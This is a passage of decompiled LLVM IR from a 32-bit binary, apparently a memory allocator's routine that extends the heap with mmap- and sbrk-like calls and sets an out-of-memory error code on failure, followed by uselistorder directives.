  br i1 %tmp133, label %dec_label_pc_804dfdf, label %dec_label_pc_804e224

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dfc7
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804dfec = call i32 @function_804f34c(i32 0, i32 %v5_804dfd2, i32 3, i32 34, i32 0, i32 0, i32 %v0_804dfdf, i32 %v0_804dfdf)
  store i32 %v8_804dfec, i32* %eax.global-to-local, align 4
  %v10_804dff4 = icmp eq i32 %v8_804dfec, -1
  store i32 %v8_804dfec, i32* @ebx, align 4
  br i1 %v10_804dff4, label %dec_label_pc_804e224, label %dec_label_pc_804dfff

dec_label_pc_804dfff:                             ; preds = %dec_label_pc_804dfdf
  %v0_804dfff = load i8, i8* @global_var_8058a60.156, align 1
  %v2_804dfff = and i8 %v0_804dfff, -2
  store i8 %v2_804dfff, i8* @global_var_8058a60.156, align 32
  %v1_804e006 = load i32, i32* @esi, align 4
  %v2_804e006 = add i32 %v1_804e006, %v8_804dfec
  store i32 %v2_804e006, i32* @edx, align 4
  br label %dec_label_pc_804e009

dec_label_pc_804e009:                             ; preds = %dec_label_pc_804df9c, %dec_label_pc_804dfff
  %v0_804e0d0 = phi i32 [ -1, %dec_label_pc_804df9c ], [ %v2_804e006, %dec_label_pc_804dfff ]
  %v0_804e0de = phi i32 [ %v1_804dfa0, %dec_label_pc_804df9c ], [ %v8_804dfec, %dec_label_pc_804dfff ]
  %v10_804e009 = icmp eq i32 %v0_804e0de, -1
  br i1 %v10_804e009, label %dec_label_pc_804e224, label %dec_label_pc_804e012

dec_label_pc_804e012:                             ; preds = %dec_label_pc_804e009
  %v0_804e016 = load i32, i32* @global_var_8058a68.153, align 8
  %v1_804e016 = load i32, i32* @esi, align 4
  %v2_804e016 = add i32 %v1_804e016, %v0_804e016
  store i32 %v2_804e016, i32* @global_var_8058a68.153, align 8
  %v2_804e01c = add i32 %v1_804df6e, %v0_804df5e
  store i32 %v2_804e01c, i32* %ecx.global-to-local, align 4
  %v2_804e01e = sub i32 %v0_804e0de, %v2_804e01c
  %v7_804e01e = icmp ult i32 %v0_804e0de, %v2_804e01c
  %v12_804e01e = icmp eq i32 %v2_804e01e, 0
  %v1_804e020 = icmp eq i1 %v12_804e01e, false
  br i1 %v1_804e020, label %dec_label_pc_804e039, label %dec_label_pc_804e022

dec_label_pc_804e022:                             ; preds = %dec_label_pc_804e012
  %v10_804e022 = icmp eq i32 %v0_804e0d0, -1
  %v1_804e025 = icmp eq i1 %v10_804e022, false
  br i1 %v1_804e025, label %dec_label_pc_804e039, label %dec_label_pc_804e027

dec_label_pc_804e027:                             ; preds = %dec_label_pc_804e022
  store i32 %v0_804df5e, i32* %ecx.global-to-local, align 4
  %v2_804e02b = add i32 %v1_804e016, %v1_804df6e
  %v1_804e02e = or i32 %v2_804e02b, 1
  store i32 %v1_804e02e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e02e, i32* %v2_804df67, align 4
  br label %dec_label_pc_804e166

dec_label_pc_804e039:                             ; preds = %dec_label_pc_804e022, %dec_label_pc_804e012
  %v0_804e039 = load i8, i8* @global_var_8058a60.156, align 1
  %v1_804e039 = sext i8 %v0_804e039 to i32
  store i32 %v1_804e039, i32* %eax.global-to-local, align 4
  %v2_804e03e = urem i8 %v0_804e039, 2
  %v3_804e03e = icmp eq i8 %v2_804e03e, 0
  br i1 %v3_804e03e, label %dec_label_pc_804e052, label %dec_label_pc_804e042

dec_label_pc_804e042:                             ; preds = %dec_label_pc_804e039
  br i1 %v2_804df6e, label %dec_label_pc_804e052, label %dec_label_pc_804e046

dec_label_pc_804e046:                             ; preds = %dec_label_pc_804e042
  %v1_804e048 = icmp eq i1 %v7_804e01e, false
  br i1 %v1_804e048, label %dec_label_pc_804e052, label %dec_label_pc_804e04a

dec_label_pc_804e04a:                             ; preds = %dec_label_pc_804e046
  %v1_804e04a = and i32 %v1_804e039, -2
  %v4_804e04a = trunc i32 %v1_804e04a to i8
  store i32 %v1_804e04a, i32* %eax.global-to-local, align 4
  store i8 %v4_804e04a, i8* @global_var_8058a60.156, align 32
  br label %dec_label_pc_804e052

dec_label_pc_804e052:                             ; preds = %dec_label_pc_804e046, %dec_label_pc_804e042, %dec_label_pc_804e039, %dec_label_pc_804e04a
  %v0_804e052 = phi i8 [ %v0_804e039, %dec_label_pc_804e046 ], [ %v0_804e039, %dec_label_pc_804e042 ], [ %v0_804e039, %dec_label_pc_804e039 ], [ %v4_804e04a, %dec_label_pc_804e04a ]
  %v1_804e052 = urem i8 %v0_804e052, 2
  %v2_804e052 = icmp eq i8 %v1_804e052, 0
  br i1 %v2_804e052, label %dec_label_pc_804e0d0, label %dec_label_pc_804e05b

dec_label_pc_804e05b:                             ; preds = %dec_label_pc_804e052
  br i1 %v2_804df6e, label %dec_label_pc_804e069, label %dec_label_pc_804e05f

dec_label_pc_804e05f:                             ; preds = %dec_label_pc_804e05b
  store i32 %v2_804e01e, i32* %eax.global-to-local, align 4
  %v2_804e063 = add i32 %v2_804e016, %v2_804e01e
  store i32 %v2_804e063, i32* @global_var_8058a68.153, align 8
  br label %dec_label_pc_804e069

dec_label_pc_804e069:                             ; preds = %dec_label_pc_804e05b, %dec_label_pc_804e05f
  %v1_804e06b = urem i32 %v0_804e0de, 8
  %v2_804e06b = icmp eq i32 %v1_804e06b, 0
  store i32 %v1_804e06b, i32* %edx.global-to-local, align 4
  %v1_804e06e = icmp eq i1 %v2_804e06b, false
  br i1 %v1_804e06e, label %dec_label_pc_804e076, label %dec_label_pc_804e070

dec_label_pc_804e070:                             ; preds = %dec_label_pc_804e069
  store i32 %v0_804e0de, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e080

dec_label_pc_804e076:                             ; preds = %dec_label_pc_804e069
  %v2_804e07b = sub nsw i32 8, %v1_804e06b
  store i32 %v2_804e07b, i32* %eax.global-to-local, align 4
  %v2_804e07d = add i32 %v2_804e07b, %v0_804e0de
  store i32 %v2_804e07d, i32* @edi, align 4
  br label %dec_label_pc_804e080

dec_label_pc_804e080:                             ; preds = %dec_label_pc_804e070, %dec_label_pc_804e076
  %v0_804e08d = phi i32 [ 0, %dec_label_pc_804e070 ], [ %v2_804e07b, %dec_label_pc_804e076 ]
  %v2_804e080 = add i32 %v1_804e016, %v0_804e0de
  %v2_804e08d = add i32 %v0_804e08d, %v1_804df6e
  store i32 %v2_804e08d, i32* %ecx.global-to-local, align 4
  %v2_804e090 = add i32 %v2_804e08d, %v2_804e080
  store i32 %v2_804e090, i32* %edx.global-to-local, align 4
  %v2_804e092 = add i32 %v2_804e090, %v1_804de80
  %v5_804e095 = and i32 %v2_804e092, %v1_804df90
  %v2_804e09c = sub i32 %v5_804e095, %v2_804e090
  store i32 %v2_804e09c, i32* %eax.global-to-local, align 4
  %v2_804e09e = add i32 %v2_804e09c, %v2_804e08d
  store i32 %v2_804e09e, i32* @esi, align 4
  store i32 %v2_804e09e, i32* %stack_var_-92, align 4
  %v1_804e0a2 = call i32 @function_804f744(i32 %v2_804e09e)
  store i32 %v1_804e0a2, i32* %eax.global-to-local, align 4
  %v10_804e0aa = icmp eq i32 %v1_804e0a2, -1
  store i32 %v1_804e0a2, i32* %edx.global-to-local, align 4
  %v1_804e0af = icmp eq i1 %v10_804e0aa, false
  br i1 %v1_804e0af, label %dec_label_pc_804e0bf, label %dec_label_pc_804e0b1

dec_label_pc_804e0b1:                             ; preds = %dec_label_pc_804e080
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804e0b6 = call i32 @function_804f744(i32 0)
  store i32 %v1_804e0b6, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0b6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e0f3

dec_label_pc_804e0bf:                             ; preds = %dec_label_pc_804e080
  %v1_804e0bf = load i32, i32* @ebx, align 4
  %v7_804e0bf = icmp ult i32 %v1_804e0a2, %v1_804e0bf
  %v1_804e0c1 = icmp eq i1 %v7_804e0bf, false
  br i1 %v1_804e0c1, label %dec_label_pc_804e0f8, label %dec_label_pc_804e0c3

dec_label_pc_804e0c3:                             ; preds = %dec_label_pc_804e0bf
  %v0_804e0c3 = load i8, i8* @global_var_8058a60.156, align 1
  %v2_804e0c3 = and i8 %v0_804e0c3, -2
  store i8 %v2_804e0c3, i8* @global_var_8058a60.156, align 32
  store i32 %v2_804e080, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e0d7

dec_label_pc_804e0d0:                             ; preds = %dec_label_pc_804e052
  %v10_804e0d0 = icmp eq i32 %v0_804e0d0, -1
  br i1 %v10_804e0d0, label %dec_label_pc_804e0db, label %dec_label_pc_804e0d5

dec_label_pc_804e0d5:                             ; preds = %dec_label_pc_804e0d0
  store i32 %v0_804e0de, i32* @edi, align 4
  br label %dec_label_pc_804e0d7

dec_label_pc_804e0d7:                             ; preds = %dec_label_pc_804e0c3, %dec_label_pc_804e0d5
  %v0_804e0f847 = phi i32 [ %v2_804e080, %dec_label_pc_804e0c3 ], [ %v0_804e0d0, %dec_label_pc_804e0d5 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e0f8

dec_label_pc_804e0db:                             ; preds = %dec_label_pc_804e0d0
  store i32 %v0_804e0de, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804e0e2 = call i32 @function_804f744(i32 0)
  store i32 %v1_804e0e2, i32* %edx.global-to-local, align 4
  %v1_804e0e9 = load i32, i32* @ebx, align 4
  %v2_804e0e9 = sub i32 %v1_804e0e2, %v1_804e0e9
  %v1_804e0eb = load i32, i32* @esi, align 4
  %v2_804e0eb = sub i32 %v2_804e0e9, %v1_804e0eb
  store i32 %v2_804e0eb, i32* %eax.global-to-local, align 4
  %v0_804e0ed = load i32, i32* @global_var_8058a68.153, align 8
  %v2_804e0ed = add i32 %v0_804e0ed, %v2_804e0eb
  store i32 %v2_804e0ed, i32* @global_var_8058a68.153, align 8
  br label %dec_label_pc_804e0f3

dec_label_pc_804e0f3:                             ; preds = %dec_label_pc_804e0b1, %dec_label_pc_804e0db
  %v0_804e0f846 = phi i32 [ %v1_804e0b6, %dec_label_pc_804e0b1 ], [ %v1_804e0e2, %dec_label_pc_804e0db ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e0f8

dec_label_pc_804e0f8:                             ; preds = %dec_label_pc_804e0bf, %dec_label_pc_804e0d7, %dec_label_pc_804e0f3
  %v0_804e0fd = phi i32 [ %v1_804e0a2, %dec_label_pc_804e0bf ], [ %v0_804e0f847, %dec_label_pc_804e0d7 ], [ %v0_804e0f846, %dec_label_pc_804e0f3 ]
  %v10_804e0f8 = icmp eq i32 %v0_804e0fd, -1
  br i1 %v10_804e0f8, label %dec_label_pc_804e166, label %dec_label_pc_804e0fd

dec_label_pc_804e0fd:                             ; preds = %dec_label_pc_804e0f8
  %v1_804e0fd = load i32, i32* @edi, align 4
  %v2_804e0fd = sub i32 %v0_804e0fd, %v1_804e0fd
  store i32 %v2_804e0fd, i32* %edx.global-to-local, align 4
  %v1_804e0ff = load i32, i32* @esi, align 4
  %v2_804e0ff = add i32 %v1_804e0ff, %v2_804e0fd
  %v1_804e102 = or i32 %v2_804e0ff, 1
  store i32 %v1_804e102, i32* %eax.global-to-local, align 4
  store i32 %v1_804e0fd, i32* @global_var_805872c.141, align 4
  %v2_804e10b = add i32 %v1_804e0fd, 4
  %v3_804e10b = inttoptr i32 %v2_804e10b to i32*
  store i32 %v1_804e102, i32* %v3_804e10b, align 4
  %v0_804e10e = load i32, i32* @global_var_8058a68.153, align 8
  %v1_804e10e = load i32, i32* @esi, align 4
  %v2_804e10e = add i32 %v1_804e10e, %v0_804e10e
  store i32 %v2_804e10e, i32* @global_var_8058a68.153, align 8
  br i1 %v2_804df6e, label %dec_label_pc_804e166, label %dec_label_pc_804e118

dec_label_pc_804e118:                             ; preds = %dec_label_pc_804e0fd
  store i32 %v0_804df5e, i32* %ecx.global-to-local, align 4
  %v1_804e11c = add i32 %v1_804df6e, -12
  %v1_804e11f = and i32 %v1_804e11c, -8
  store i32 %v1_804e11f, i32* %eax.global-to-local, align 4
  %v1_804e124 = or i32 %v1_804e11f, 1
  store i32 %v1_804e124, i32* %edx.global-to-local, align 4
  %v5_804e127 = icmp ult i32 %v1_804e11f, 15
  store i32 %v1_804e124, i32* %v2_804df67, align 4
  %v0_804e12d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e12d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e12d = add i32 %v0_804e12d, 4
  %v3_804e12d = add i32 %v2_804e12d, %v1_804e12d
  %v4_804e12d = inttoptr i32 %v3_804e12d to i32*
  store i32 5, i32* %v4_804e12d, align 4
  %v0_804e135 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e135 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e135 = add i32 %v0_804e135, 8
  %v3_804e135 = add i32 %v2_804e135, %v1_804e135
  %v4_804e135 = inttoptr i32 %v3_804e135 to i32*
  store i32 5, i32* %v4_804e135, align 4
  br i1 %v5_804e127, label %dec_label_pc_804e166, label %dec_label_pc_804e13f

dec_label_pc_804e13f:                             ; preds = %dec_label_pc_804e118
  %v0_804e13f = load i32, i32* @global_var_8058a44.157, align 4
  store i32 %v0_804e13f, i32* @ebx, align 4
  %v0_804e145 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e14a = add i32 %v0_804e145, 8
  store i32 %v1_804e14a, i32* %eax.global-to-local, align 4
  store i32 %v1_804e14a, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8058a44.157, align 4
  %v1_804e158 = call i32 @function_804e481(i32 %v1_804e14a)
  store i32 %v1_804e158, i32* %eax.global-to-local, align 4
  %v0_804e160 = load i32, i32* @ebx, align 4
  store i32 %v0_804e160, i32* @global_var_8058a44.157, align 4
  br label %dec_label_pc_804e166

dec_label_pc_804e166:                             ; preds = %dec_label_pc_804e118, %dec_label_pc_804e0fd, %dec_label_pc_804e0f8, %dec_label_pc_804e027, %dec_label_pc_804e13f
  %v0_804e166 = load i32, i32* @global_var_8058a68.153, align 8
  %v0_804e16b = load i32, i32* @global_var_8058a6c.158, align 4
  %v0_804e177 = load i32, i32* @global_var_805872c.141, align 4
  store i32 %v0_804e177, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_804e166, %v0_804e16b
  %v5_804e17d = select i1 %tmp89, i32 %v0_804e16b, i32 %v0_804e166
  store i32 %v5_804e17d, i32* @edx, align 4
  %v1_804e180 = load i32, i32* @global_var_8058a64.152, align 4
  %v2_804e180 = add i32 %v1_804e180, %v0_804e166
  store i32 %v5_804e17d, i32* @global_var_8058a6c.158, align 4
  %v1_804e18c = load i32, i32* @global_var_8058a74.154, align 4
  %tmp90 = icmp ule i32 %v2_804e180, %v1_804e18c
  %v5_804e192 = select i1 %tmp90, i32 %v1_804e18c, i32 %v2_804e180
  store i32 %v5_804e192, i32* %eax.global-to-local, align 4
  store i32 %v5_804e192, i32* @global_var_8058a74.154, align 4
  %v1_804e19e = add i32 %v0_804e177, 4
  %v2_804e19e = inttoptr i32 %v1_804e19e to i32*
  %v3_804e19e = load i32, i32* %v2_804e19e, align 4
  %v1_804e1a1 = and i32 %v3_804e19e, -4
  store i32 %v1_804e1a1, i32* @ecx, align 4
  %v10_804e1a4 = icmp ult i32 %v1_804e1a1, %v1_804de1e
  br i1 %v10_804e1a4, label %dec_label_pc_804e224, label %dec_label_pc_804e1aa

dec_label_pc_804e1aa:                             ; preds = %dec_label_pc_804e166
  store i32 %v1_804dea6, i32* %esi.global-to-local, align 4
  %v2_804e1b0 = sub i32 %v1_804e1a1, %v1_804dea6
  store i32 %v2_804e1b0, i32* %ecx.global-to-local, align 4
  %v2_804e1b2 = add i32 %v0_804e177, %v1_804dea6
  store i32 %v2_804e1b2, i32* @edx, align 4
  %v1_804e1b5 = or i32 %v1_804dea6, 1
  store i32 %v1_804e1b5, i32* %eax.global-to-local, align 4
  store i32 %v2_804e1b2, i32* @global_var_805872c.141, align 4
  store i32 %v1_804e1b5, i32* %v2_804e19e, align 4
  %v0_804e1c1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e1c1

dec_label_pc_804e1c1:                             ; preds = %dec_label_pc_804de2c, %dec_label_pc_804e1aa
  %v0_804e1c1 = phi i32 [ %v5_804de3f, %dec_label_pc_804de2c ], [ %v0_804e1c1.pre, %dec_label_pc_804e1aa ]
  %v1_804e1c1 = or i32 %v0_804e1c1, 1
  store i32 %v1_804e1c1, i32* @ecx, align 4
  %v0_804e1c4 = load i32, i32* @ebx, align 4
  %v1_804e1c4 = add i32 %v0_804e1c4, 8
  store i32 %v1_804e1c4, i32* %ebx.global-to-local, align 4
  %v1_804e1c7 = load i32, i32* @edx, align 4
  %v2_804e1c7 = add i32 %v1_804e1c7, 4
  %v3_804e1c7 = inttoptr i32 %v2_804e1c7 to i32*
  store i32 %v1_804e1c1, i32* %v3_804e1c7, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804e1cc:                             ; preds = %dec_label_pc_804dbde
  %v5_804e1d2 = sub i32 %v1_804dbc1, %v1_804dea6
  store i32 %v5_804e1d2, i32* %eax.global-to-local, align 4
  %v2_804e1d6 = add i32 %v0_804dc8c113, %v1_804dea6
  store i32 %v2_804e1d6, i32* @edx, align 4
  %v1_804e1da = or i32 %v1_804dea6, 1
  store i32 %v2_804e1d6, i32* @global_var_8058730.142, align 16
  store i32 %v1_804e1da, i32* %v2_804dbbb, align 4
  %v0_804e1e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e1e8 = or i32 %v0_804e1e6, 1
  store i32 %v1_804e1e8, i32* @ecx, align 4
  %v0_804e1eb = load i32, i32* @edx, align 4
  store i32 %v0_804e1eb, i32* @global_var_805873c.159, align 4
  store i32 %v0_804e1eb, i32* @global_var_8058740.144, align 64
  %v1_804e1f7 = add i32 %v0_804e1eb, 8
  %v2_804e1f7 = inttoptr i32 %v1_804e1f7 to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804e1f7, align 4
  %v0_804e1fe = load i32, i32* @edx, align 4
  %v1_804e1fe = add i32 %v0_804e1fe, 12
  %v2_804e1fe = inttoptr i32 %v1_804e1fe to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804e1fe, align 4
  %v0_804e205 = load i32, i32* @ecx, align 4
  %v1_804e205 = load i32, i32* @edx, align 4
  %v2_804e205 = add i32 %v1_804e205, 4
  %v3_804e205 = inttoptr i32 %v2_804e205 to i32*
  store i32 %v0_804e205, i32* %v3_804e205, align 4
  %v0_804e208 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e208 = load i32, i32* @edx, align 4
  %v3_804e208 = add i32 %v1_804e208, %v0_804e208
  %v4_804e208 = inttoptr i32 %v3_804e208 to i32*
  store i32 %v0_804e208, i32* %v4_804e208, align 4
  br label %dec_label_pc_804e216

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804dbed
  store i32 %v1_804dea6, i32* %ebx.global-to-local, align 4
  %v0_804e211 = load i32, i32* @ebp, align 4
  %v2_804e211 = or i32 %v1_804dea6, 4
  %v3_804e211 = add i32 %v0_804e211, %v2_804e211
  %v4_804e211 = inttoptr i32 %v3_804e211 to i32*
  %v5_804e211 = load i32, i32* %v4_804e211, align 4
  %v6_804e211 = or i32 %v5_804e211, 1
  store i32 %v6_804e211, i32* %v4_804e211, align 4
  br label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e1cc, %dec_label_pc_804e20d
  %v0_804e216 = load i32, i32* @ebp, align 4
  %v1_804e216 = add i32 %v0_804e216, 8
  store i32 %v1_804e216, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804e21b:                             ; preds = %dec_label_pc_804dcdd
  %v1_804e21b = load i32, i32* @ebx, align 4
  %v2_804e21b = add i32 %v0_804dce9, 4
  %v3_804e21b = add i32 %v2_804e21b, %v1_804e21b
  %v4_804e21b = inttoptr i32 %v3_804e21b to i32*
  %v5_804e21b = load i32, i32* %v4_804e21b, align 4
  %v6_804e21b = or i32 %v5_804e21b, 1
  store i32 %v6_804e21b, i32* %v4_804e21b, align 4
  br label %dec_label_pc_804e220

dec_label_pc_804e220:                             ; preds = %dec_label_pc_804dcf5, %dec_label_pc_804e21b
  %v0_804e220 = load i32, i32* @ecx, align 4
  store i32 %v0_804e220, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804e224:                             ; preds = %dec_label_pc_804dfc7, %dec_label_pc_804e166, %dec_label_pc_804e009, %dec_label_pc_804dfdf
  %v0_804e224 = load i32, i32* %stack_var_-92, align 4
  %v1_804e224 = call i32 @function_804b7f4(i32 %v0_804e224)
  store i32 %v1_804e224, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804e22b = inttoptr i32 %v1_804e224 to i32*
  store i32 12, i32* %v1_804e22b, align 4
  br label %dec_label_pc_804e231

dec_label_pc_804e231:                             ; preds = %dec_label_pc_804e220, %dec_label_pc_804e216, %dec_label_pc_804e1c1, %dec_label_pc_804de57, %dec_label_pc_804de09, %dec_label_pc_804db88, %dec_label_pc_804e224
  store i32 %v2_804dabf, i32* @eax, align 4
  store i32 %v2_804dabf, i32* %stack_var_-92, align 4
  %v2_804e23a = call i32 @function_804f016(i32 %v2_804dabf, i32 1)
  store i32 %v2_804e23a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e242

dec_label_pc_804e242:                             ; preds = %dec_label_pc_804dadd, %dec_label_pc_804e231
  %v0_804e245 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e245, i32* %eax.global-to-local, align 4
  %v2_804e247 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e247, i32* @ebx, align 4
  store i32 %v0_804daac, i32* @esi, align 4
  store i32 %v0_804daab, i32* @edi, align 4
  store i32 %v0_804daaa, i32* @ebp, align 4
  ret i32 %v0_804e245

; uselistorder directives
  uselistorder i32 %v0_804e208, { 1, 0 }
  uselistorder i32 %v1_804e18c, { 1, 0 }
  uselistorder i32 %v2_804e180, { 1, 0 }
  uselistorder i32 %v0_804e16b, { 1, 0 }
  uselistorder i32 %v0_804e166, { 0, 2, 1 }
  uselistorder i32 %v1_804e0fd, { 1, 0, 2 }
  uselistorder i32 %v0_804e0fd, { 1, 0 }
  uselistorder i32 %v2_804e0eb, { 1, 0 }
  uselistorder i32 %v1_804e0a2, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804e090, { 1, 0, 2 }
  uselistorder i32 %v2_804e080, { 1, 2, 0 }
  uselistorder i32 %v2_804e07b, { 1, 0, 2 }
  uselistorder i32 %v1_804e06b, { 2, 1, 0 }
  uselistorder i8 %v0_804e039, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804e01c, { 1, 0, 2 }
  uselistorder i32 %v0_804e0de, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_804e0d0, { 2, 0, 1 }
  uselistorder i32 %v8_804dfec, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_804dfd2, { 1, 0, 2 }
  uselistorder i32 %v3_804dfd2, { 1, 0 }
  uselistorder i32 %v1_804dfa0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804df94, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804df90, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804df7e, { 1, 0 }
  uselistorder i32 %v1_804df6e, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_804df5e, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_804df47, { 1, 0 }
  uselistorder i32 %v2_804df3b, { 1, 0 }
  uselistorder i32 %v2_804df2b, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804df0f, { 1, 2, 0 }
  uselistorder i32 %v1_804df0f, { 1, 0, 2 }
  uselistorder i32 %v1_804df0e, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804df08, { 1, 0 }
  uselistorder i32 %v2_804dee6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804deda, { 2, 1, 0 }
  uselistorder i32 %v8_804dec5, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_804deac, { 1, 0, 2 }
  uselistorder i32 %v0_804de4f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804de1e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804de11, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804ddf7, { 1, 0, 2 }
  uselistorder i32 %v1_804dd91, { 1, 0 }
  uselistorder i32 %v3_804dd86, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_804dd80, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804dd7d12, { 1, 0 }
  uselistorder i32 %v2_804dd72, { 1, 0 }
  uselistorder i32 %v1_804dd56, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804dd52, { 2, 1, 0 }
  uselistorder i32 %v1_804dd4e, { 1, 0 }
  uselistorder i32 %v1_804dd49, { 2, 1, 0 }
  uselistorder i32 %v2_804dd38, { 1, 0 }
  uselistorder i32 %v1_804dd35, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804dcd3, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_804dd1e, { 1, 0 }
  uselistorder i32 %v0_804dce9, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804dcbf, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804dc8c, { 0, 2, 1 }
  uselistorder i32 %v2_804dc70, { 1, 0 }
  uselistorder i32 %v1_804dc66, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804dc61.lcssa, { 1, 0 }
  uselistorder i32 %v3_804dc51, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804dc48, { 1, 0, 2 }
  uselistorder i32 %v3_804dc2b, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_804dc24, { 1, 0, 2 }
  uselistorder i32 %v2_804dc0c, { 2, 1, 0 }
  uselistorder i32 %v0_804dbf8, { 2, 1, 3, 0 }
  uselistorder i32 %v3_804dbbe, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dc8c113, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804dc8c107, { 1, 0, 2 }
  uselistorder i32 %v3_804db6b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804db5d, { 2, 1, 0 }
  uselistorder i32 %v2_804db38, { 2, 1, 0 }
  uselistorder i8 %v0_804db06, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_804dea6, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804daef, { 1, 2, 0 }
  uselistorder i32 %v0_804dad8, { 1, 0 }
  uselistorder i32 %v2_804dabf, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8058a60.156, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_804f34c, { 1, 0 }
  uselistorder i32 134580020, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8058740.144, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804da84, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805872c.141 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805872c.141 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804e242, { 1, 0 }
  uselistorder label %dec_label_pc_804e231, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804e224, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804e220, { 1, 0 }
  uselistorder label %dec_label_pc_804e216, { 1, 0 }
  uselistorder label %dec_label_pc_804e1c1, { 1, 0 }
  uselistorder label %dec_label_pc_804e166, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e0f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e0f3, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d7, { 1, 0 }
  uselistorder label %dec_label_pc_804e080, { 1, 0 }
  uselistorder label %dec_label_pc_804e069, { 1, 0 }
